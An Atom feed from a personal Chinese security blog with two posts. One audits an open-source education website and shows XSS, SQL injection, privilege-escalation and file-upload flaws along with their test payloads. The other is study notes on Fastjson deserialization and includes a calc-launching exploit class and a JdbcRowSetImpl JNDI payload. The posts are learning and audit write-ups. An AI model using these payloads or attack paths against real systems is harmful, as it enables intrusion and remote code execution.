<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://limpid94.github.io</id>
    <title>Limpid</title>
    <updated>2021-08-15T17:22:41.609Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://limpid94.github.io"/>
    <link rel="self" href="https://limpid94.github.io/atom.xml"/>
    <subtitle>Keep thinking , keeping learning</subtitle>
    <logo>https://limpid94.github.io/images/avatar.png</logo>
    <icon>https://limpid94.github.io/favicon.ico</icon>
    <rights>All rights reserved 2021, Limpid</rights>
    <entry>
        <title type="html"><![CDATA[【Java-WEB】酷因教育网站代码审计]]></title>
        <id>https://limpid94.github.io/post/java-web-ku-yin-jiao-yu-wang-zhan-dai-ma-shen-ji/</id>
        <link href="https://limpid94.github.io/post/java-web-ku-yin-jiao-yu-wang-zhan-dai-ma-shen-ji/">
        </link>
        <updated>2021-08-11T17:27:02.000Z</updated>
        <content type="html"><![CDATA[<h2 id="源码搭建">源码搭建</h2>
<p>使用IDEA打开源码，首先修改pom.xml的几处地方<br>
<img src="https://limpid94.github.io/post-images/1629042015880.PNG" alt="" loading="lazy"><br>
接着修改project.properties的配置<br>
<img src="https://limpid94.github.io/post-images/1629042035467.PNG" alt="" loading="lazy"><br>
随后配置运行环境<br>
<img src="https://limpid94.github.io/post-images/1629042048903.PNG" alt="" loading="lazy"><br>
最后导入sql文件到mysql中即可。</p>
<h2 id="审计经过">审计经过</h2>
<h3 id="反射型xss漏洞">反射型XSS漏洞</h3>
<h4 id="黑盒测试情况">黑盒测试情况：</h4>
<p>直接在搜索框输入<code>&quot;&gt;&lt;img+src=&quot;x&quot;+onerror=&quot;alert(/xxx/)</code>，则在相应包中原样输出，未经过滤，直接触发XSS弹窗。<br>
<img src="https://limpid94.github.io/post-images/1629001212130.PNG" alt="" loading="lazy"></p>
<h4 id="白盒审计情况">白盒审计情况</h4>
<p>先看web.xml的filter配置情况。<br>
<img src="https://limpid94.github.io/post-images/1629001508283.PNG" alt="" loading="lazy"><br>
从中未发现有XSS的相关过滤项。于是从相应包的XSS的位置找到对应的前端<code>header.jsp</code>，发现搜索框的具体内容是用EL表达式进行取值。<br>
<img src="https://limpid94.github.io/post-images/1629001897658.PNG" alt="" loading="lazy"><br>
于是从entity中找到具体的内容<br>
<img src="https://limpid94.github.io/post-images/1629001888577.PNG" alt="" loading="lazy"><br>
而该值是从数据库中查询的：<br>
<img src="https://limpid94.github.io/post-images/1629002287672.PNG" alt="" loading="lazy"><br>
<img src="https://limpid94.github.io/post-images/1629002312744.PNG" alt="" loading="lazy"><br>
到目前的反向追溯都没有发现有转义或者过滤。再到controller层进行查看<br>
<img src="https://limpid94.github.io/post-images/1629002483122.PNG" alt="" loading="lazy"><br>
浏览下来也没有对XSS进行处理，因此最后会将危险的XSSpayload原样输出。</p>
<h3 id="sql注入前台和后台">SQL注入（前台和后台）</h3>
<p>首先全局搜索<code>${</code>，因为使用<code>${}</code>进行数据库查询是不经过预编译的，因此可能存在SQL注入<br>
<img src="https://limpid94.github.io/post-images/1628921420323.PNG" alt="" loading="lazy"><br>
数量还是比较多，任选一处入手好了。<br>
<img src="https://limpid94.github.io/post-images/1628921575493.PNG" alt="" loading="lazy"><br>
看到此处的对应的方法为<code>delMsgSystemById</code>，查看dao中相应的接口：<br>
<img src="https://limpid94.github.io/post-images/1628923025919.PNG" alt="" loading="lazy"><br>
再看service相关的代码是如何实现的。具体的代码在<code>MsgSystemServiceImpl.java</code>中<br>
<img src="https://limpid94.github.io/post-images/1628923498595.PNG" alt="" loading="lazy"><br>
通过其对应到的<code>AdminMsgSystemController.java</code>的源码可以看到对应的接口名称和传入参数<br>
<img src="https://limpid94.github.io/post-images/1628923677426.PNG" alt="" loading="lazy"><br>
通过对逻辑代码的审查，看到如果查询成功就显示json字符串的</p>
<pre><code class="language-json">{&quot;success&quot;:true,&quot;message&quot;:&quot;操作成功！&quot;,&quot;entity&quot;:null}
</code></pre>
<p>否则显示</p>
<pre><code class="language-json">{&quot;success&quot;:true,&quot;message&quot;:&quot;系统繁忙,请稍后再试！&quot;,&quot;entity&quot;:null}
</code></pre>
<p>由此推断该注入类型为盲注。<br>
但由于是在后台，所以需要先用管理员账号登录后再尝试访问接口。<br>
<img src="https://limpid94.github.io/post-images/1628923908100.PNG" alt="" loading="lazy"><br>
通过后台的debug日志，发现确实带入了我们的“恶意”语句<br>
<img src="https://limpid94.github.io/post-images/1628923993785.PNG" alt="" loading="lazy"><br>
此处以查询当前user()的首位字符为例，当ascii码大于113的时候执行了sleep(3)，大于114时直接返回。<br>
<img src="https://limpid94.github.io/post-images/1628924643788.PNG" alt="" loading="lazy"><br>
<img src="https://limpid94.github.io/post-images/1628924652053.PNG" alt="" loading="lazy"><br>
由此现象可以说明当前user()的首位字符的ascii码为114，转成字符为<code>r</code><br>
当然，此处要利用还是比较鸡肋的，继续看看是否存在前端的SQL注入。<br>
继续查找，发现<code>CourseFavoritesMapper.xml</code>中存在SQL注入的“标志”<br>
<img src="https://limpid94.github.io/post-images/1628925616258.PNG" alt="" loading="lazy"><br>
通过id去dao中查找对应的接口情况：<br>
<img src="https://limpid94.github.io/post-images/1628925723642.PNG" alt="" loading="lazy"><br>
又找到对应的serviceImpl<br>
<img src="https://limpid94.github.io/post-images/1628925779369.PNG" alt="" loading="lazy"><br>
最后定位到Controller<br>
<img src="https://limpid94.github.io/post-images/1628925802781.PNG" alt="" loading="lazy"><br>
看到对应的url是<code>/deleteFaveorite/{ids}</code>，当然直接这样访问是不对的，因为在这个controller一开始的地方多了个<code>RequestMapping</code>注解<br>
<img src="https://limpid94.github.io/post-images/1628925796096.PNG" alt="" loading="lazy"><br>
因此正确的接口是<code>/uc/deleteFaveorite/{ids}</code><br>
尝试访问<code>/uc/deleteFaveorite/29'</code>发现报错<br>
<img src="https://limpid94.github.io/post-images/1628928733737.PNG" alt="" loading="lazy"><br>
从后台的日志可以看到报错，并且查询语句确实传入我们的单引号。<br>
<img src="https://limpid94.github.io/post-images/1628928752438.PNG" alt="" loading="lazy"><br>
使用sqlmap进行测试，结果存在注入。<br>
<img src="https://limpid94.github.io/post-images/1628929004341.PNG" alt="" loading="lazy"><br>
其余的注入点不再一一测试。</p>
<h3 id="越权">越权</h3>
<p>为了测试，注册两个普通用户123@qq.com和111@q.com。id分别为68和69。<br>
现在登录id为69的账户，修改名称为张三后提交并拦截数据包：<br>
<img src="https://limpid94.github.io/post-images/1628931594712.PNG" alt="" loading="lazy"></p>
<p><img src="https://limpid94.github.io/post-images/1628931671504.PNG" alt="" loading="lazy"><br>
发送后登录id为68的账号查看情况<br>
<img src="https://limpid94.github.io/post-images/1628931748620.PNG" alt="" loading="lazy"><br>
为了究其原因，需要从代码层面入手。<br>
首先到controller中找到对应的逻辑代码。<br>
<img src="https://limpid94.github.io/post-images/1628931856524.PNG" alt="" loading="lazy"><br>
可以看到直接把传入的POST参数实例化成User类的实例并对应赋值后带入数据库执行。再UserServiceImpl.java中第95行看到直接执行dao的updateUser方法。<br>
<img src="https://limpid94.github.io/post-images/1628931991994.PNG" alt="" loading="lazy"><br>
在对应的mapper中找到更新语句：<br>
<img src="https://limpid94.github.io/post-images/1628932076937.PNG" alt="" loading="lazy"><br>
由此可见整个流程并没有对用户身份进行校验，导致用户可以修改任意账号的信息。<br>
进一步思考：能否改到admin账号呢？<br>
从UserMapper.xml中看到，update的语句是执行的表明是EDU_USER，而admin是在SYS_USER中，因此不可以修改admin账号的任何信息。</p>
<h3 id="任意文件上传">任意文件上传</h3>
<p>在前台用户的头像上传功能上传头像时可以指定上传类型并上传恶意代码，从而获取服务器权限。<br>
在测试上传文件时发现fileType参数是允许的类型，如果filename的后缀在fileType所指定的范围内，则可以上传成功（但是经过测试，jsp后缀不可以）<br>
<img src="https://limpid94.github.io/post-images/1628956875828.PNG" alt="" loading="lazy"><br>
<img src="https://limpid94.github.io/post-images/1628956902279.PNG" alt="" loading="lazy"></p>
<p>原想向从上传的数据包来定位controller，发现没有相关的路径，但是找到在<code>src/main/java/com/inxedu/os/common/controller/VideoUploadController.java</code>中有<code>gok4</code>方法，仔细观察和我们上传图片的数据包中的参数均相同<br>
<img src="https://limpid94.github.io/post-images/1628961316862.PNG" alt="" loading="lazy"><br>
从流程中看出，后台会将上传文件的后缀名称是否包含在上传的fileType的值中，若有则进行落地，否则报错。但是这整个过程并没有对后缀进行黑名单检查或者白名单限制。因此可以上传jspx后缀的文件。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Fastjson反序列化学习笔记（一）]]></title>
        <id>https://limpid94.github.io/post/fastjson-fan-xu-lie-hua-xue-xi-bi-ji-yi-chu-shi-lou-dong/</id>
        <link href="https://limpid94.github.io/post/fastjson-fan-xu-lie-hua-xue-xi-bi-ji-yi-chu-shi-lou-dong/">
        </link>
        <updated>2021-08-02T17:20:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="什么是fastjson">什么是Fastjson</h2>
<blockquote>
<p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。</p>
</blockquote>
<h2 id="使用fastjson进行序列化">使用Fastjson进行序列化</h2>
<p>Fastjson在对对象进行序列化和反序列化时，需要使用到如下三个函数：</p>
<ul>
<li><code>JSON.toJSONString()</code></li>
<li><code>JSON.parse()</code></li>
<li><code>JSON.parseObject()</code></li>
</ul>
<h3 id="一段demo">一段Demo</h3>
<p>现在先尝试使用fastjson对自定义的类进行反序列化，熟悉以下具体的操作。</p>
<pre><code class="language-java">package cc.study;

public class User {
    private Long id;
    private String name;

    public Long getId() {
        return id;
    }

    public void setId(Long id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }
}
</code></pre>
<p>然后编写main函数</p>
<pre><code class="language-java">package cc.study;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

import java.security.spec.EncodedKeySpec;

public class FastjsonStudy {
    public static void Enc(){
        User guestUser = new User();
        guestUser.setId(3L);
        guestUser.setName(&quot;ZHANGSAN&quot;);
        String jsonString = JSON.toJSONString(guestUser);
        System.out.println(jsonString);
    }

    public static void main(String[] args) {
        Enc();
    }
}
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://limpid94.github.io/post-images/1627985599522.PNG" alt="" loading="lazy"></figure>
<p>若要在结果中输出类型信息，需要使用<code>String jsonString = JSON.toJSONString(guestUser, SerializerFeature.WriteClassName);</code><br>
则输出的结果为：<br>
<img src="https://limpid94.github.io/post-images/1627987808220.PNG" alt="" loading="lazy"></p>
<p>接下来要了解两个反序列化方法在反序列化的结果有何不同。同样使用上面的User类，但是此时添加toString方法方便将反序列化后的类进行输出。</p>
<pre><code class="language-java">    @Override
    public String toString() {
        return &quot;User{&quot; +
                &quot;id=&quot; + id +
                &quot;, name='&quot; + name + '\'' +
                '}';
    }
</code></pre>
<p>测试的4中方法分别为</p>
<ul>
<li>第一种：JSON.parse(serializedStr)</li>
<li>第二种：JSON.parseObject(serializedStr)</li>
<li>第三种：JSON.parseObject(serializedStr, Object.class)</li>
<li>第四种：JSON.parseObject(serializedStr, User.class)</li>
</ul>
<p>测试代码如下：</p>
<pre><code class="language-java">package cc.study;

import com.alibaba.fastjson.JSON;

public class test1 {
    public static void main(String[] args) {
        String jstring = &quot;{\&quot;@type\&quot;:\&quot;cc.study.User\&quot;,\&quot;id\&quot;:3,\&quot;name\&quot;:\&quot;ZHANGSAN\&quot;}&quot;;
        System.out.println(&quot;[*] ============= 通过parse方法进行反序列化 ===========&quot;);
        System.out.println(&quot;JSON.parse(serializedStr)：&quot;);
        Object obj1 = JSON.parse(jstring);
        System.out.println(&quot;parse反序列化对象名称:&quot; + obj1.getClass().getName());
        System.out.println(&quot;parse反序列化：&quot; + obj1);
        System.out.println(&quot;-----------------------------------------------\n&quot;);
        System.out.println(&quot;JSON.parseObject(serializedStr)：&quot;);
        Object obj2 = JSON.parseObject(jstring);
        System.out.println(&quot;parseObject反序列化对象名称:&quot; + obj2.getClass().getName());
        System.out.println(&quot;parseObject反序列化:&quot; + obj2);
        System.out.println(&quot;-----------------------------------------------\n&quot;);

        //通过parseObject,指定为object.class
        System.out.println(&quot;JSON.parseObject(serializedStr, Object.class)：&quot;);
        Object obj3 = JSON.parseObject(jstring, Object.class);
        System.out.println(&quot;parseObject反序列化对象名称:&quot; + obj3.getClass().getName());
        System.out.println(&quot;parseObject反序列化:&quot; + obj3);
        System.out.println(&quot;-----------------------------------------------\n&quot;);

        //通过parseObject,指定为User.class
        System.out.println(&quot;JSON.parseObject(serializedStr, User.class)：&quot;);
        Object obj4 = JSON.parseObject(jstring, User.class);
        System.out.println(&quot;parseObject反序列化对象名称:&quot; + obj4.getClass().getName());
        System.out.println(&quot;parseObject反序列化:&quot; + obj4);
        System.out.println(&quot;-----------------------------------------------\n&quot;);
    }
}

</code></pre>
<figure data-type="image" tabindex="2"><img src="https://limpid94.github.io/post-images/1628004571112.PNG" alt="" loading="lazy"></figure>
<p>从结果可以知晓：</p>
<ul>
<li>第一种情况，在指定<code>@type</code>后会自动调用默认类的构造器（此处为User的构造器）、User类的setter方法并最终产生一个User类的实例。此处会给public修饰的赋值，而不会给private修饰的赋值。在1.2.22, 1.1.54.android之后，增加了一个SupportNonPublicField特性，就算private修饰的没有setter方法也能成功赋值。</li>
<li>第二种情况，在指定了@type的情况下，自动调用了User类默认构造器，User类对应的setter方法以及对应的getter方法，最终结果是一个字符串。</li>
<li>第三种情况，在指定了@type的情况下，这种写法和第一种JSON.parse(serializedStr)写法其实没有区别的。</li>
<li>第四种情况，在指定了@type的情况下，自动调用了User类默认构造器，User类对应的setter方法，最终生成User类的一个实例。</li>
</ul>
<h3 id="fastjson大致框架">Fastjson大致框架</h3>
<p><img src="https://limpid94.github.io/post-images/1628012127988.png" alt="" loading="lazy"><br>
<code>JSON的门面类</code>主要提供静态方法，例如parse、parseObject。而具体的实现则在<code>DefaultJSONParser</code>中。<code>ParserConfig</code>主要保存一些相关配置信息，<code>JSONLexerBase</code>这个类用来处理字符分析。而反序列化用到的<code>JavaBeanDeserializer</code>则是JavaBean反序列化处理主类。</p>
<h2 id="fastjson反序列化漏洞">Fastjson反序列化漏洞</h2>
<h3 id="产生原因">产生原因</h3>
<p>漏洞是利用fastjson autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。</p>
<h2 id="poc代码">POC代码</h2>
<p>POC在网上流传的类型可分为三类：</p>
<ol>
<li>基于TemplateImpl</li>
<li>基于JNDI Bean Property类型</li>
<li>基于JNDI Field类型</li>
</ol>
<p>在第一种情况下，基于TemplateImpl需要打开SupportNonPublic开关，受到的限制比较多</p>
<h3 id="恶意类的编写">恶意类的编写</h3>
<pre><code class="language-java">import java.io.IOException;

public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{&quot;calc.exe&quot;});
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
</code></pre>
<p>之后使用javac对其进行编译，生成Exploit.class即可。</p>
<h3 id="基于templateimpl的poc">基于TemplateImpl的POC</h3>
<p>实质：用<code>bytecode</code>字段传入恶意类，调用<code>outputProperties</code>属性的getter方法时传入恶意类并调用其构造方法，导致命令执行。</p>
<p>调用链：</p>
<p>-&gt; TemplatesImpl()<br>
-&gt; getOutputProperties()<br>
-&gt; newTransformer()<br>
-&gt; getTransletInstance()<br>
-&gt; defineTransletClasses()<br>
-&gt; newInstance()</p>
<p>在TemplatesImpl类实例化后，会执行相应的setter方法给属性赋值，而到了<code>_outputProperties</code>属性时会调用其<code>getOutputProperties()</code>方法，其中调用了<code>newTransformer()</code>方法:</p>
<pre><code class="language-java">public synchronized Properties getOutputProperties() {
        try {
            return newTransformer().getOutputProperties();
        }
        catch (TransformerConfigurationException e) {
            return null;
        }
    }
</code></pre>
<p><code>newTransformer</code>调用<code>getTransletInstance()</code>方法：<br>
<img src="https://limpid94.github.io/post-images/1628239706767.PNG" alt="" loading="lazy"><br>
其中有两个关键的方法，defineTransletClasses() 和 newInstance() ，前者是把恶意类带到数组中去，后者用于实例化<code>_class[_transletIndex]</code> 中的Class。<br>
<img src="https://limpid94.github.io/post-images/1628242435685.PNG" alt="" loading="lazy"><br>
从方法的代码可以看到其中调用了<code>defindClass</code>方法处理所传入的恶意类的字节码。第299行的<code>defineClass</code>从<code>byte[]</code>中还原出了恶意类对象并放入到了_class[]数组中<br>
而后getTransletInstance()方法调用newInstance() 反射实例化恶意类，成功执行命令<br>
<img src="https://limpid94.github.io/post-images/1628242740407.PNG" alt="" loading="lazy"></p>
<h3 id="基于jndi-bean-property类型的poc">基于JNDI Bean Property类型的POC</h3>
<pre><code class="language-json">{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://localhost:33891/Exploit&quot;,&quot;autoCommit&quot;:true}
</code></pre>
<p>本质上是Fastjson在反序列化时会调用目标类的<code>setter</code>方法，在Gadget <code>com.sun.rowset.JdbcRowSetImpl的setAutoCommit()</code>方法中调用了<code>lookup()</code>,且其参数(DataSourceName的setter方法设置)可控，导致JNDI注入,最终任意命令执行</p>
<p>利用链</p>
<p>-&gt; JdbcRowSetImpl.execute()<br>
-&gt; JdbcRowSetImpl.prepare()<br>
-&gt; JdbcRowSetImpl.connect()<br>
-&gt; InitialContext.lookup(dataSource)</p>
<p>能够使用JdbcRowSetImpl的原因是：<br>
Fastjson会调用对应的setter、getter方法，而传入的序列化字符串中含有<code>dataSourceName</code>，因此会调用<code>setDataSourceName(String dsName)</code>，其方法的源码如下：<br>
<img src="https://limpid94.github.io/post-images/1628183795947.PNG" alt="" loading="lazy"><br>
而<code>autoCommit</code>参数也会使Fastjson去调用<code>setAutoCommit</code>，其源码如下：<br>
<img src="https://limpid94.github.io/post-images/1628184214717.PNG" alt="" loading="lazy"><br>
其中调用了<code>connet()</code>方法：<br>
<img src="https://limpid94.github.io/post-images/1628184427534.PNG" alt="" loading="lazy"><br>
在该方法中的<code>getDataSourceName()</code>来获取<code>DataSourceName</code>，也就是上面的<code>setDataSourceName()</code>，因此可以构成一条利用连。</p>
<h3 id="基于jndi-field类型的poc">基于JNDI Field类型的POC</h3>
<p>暂时未找到太多的材料，之后有机会整理全再补充。</p>
<h2 id="参考材料">参考材料</h2>
<p>http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</p>
<p>https://www.freebuf.com/column/216631.html</p>
<p>https://paper.seebug.org/1274/<br>
https://5alt.me/2017/09/fastjson%E8%B0%83%E8%AF%95%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/</p>
]]></content>
    </entry>
</feed>